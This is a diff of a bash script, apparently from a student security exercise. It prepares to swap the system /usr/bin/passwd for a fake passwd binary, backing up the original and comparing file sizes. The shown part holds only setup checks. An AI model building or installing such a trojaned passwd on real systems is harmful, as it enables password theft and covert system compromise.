@@ -1,8 +1,17 @@
-#!/usr/bin/sh
+#!/usr/bin/bash
+
+fake_passwd="/home/stocki/Schreibtisch/dev/syse/shell/passwd"
 
 real_passwd="/usr/bin/passwd"
 real_passwd_backup="/usr/bin/chpwd"
-fake_passwd="/home/stocki/Schreibtisch/dev/syse/shell/passwd"
+
+if [[ -f "$real_passwd_backup" ]]
+then
+    echo "exit: already installed"
+    exit
+else 
+    echo "install now"
+fi
 
 size_real=$(du -b $real_passwd | cut -f1)
 size_fake=$(du -b $fake_passwd | cut -f1)
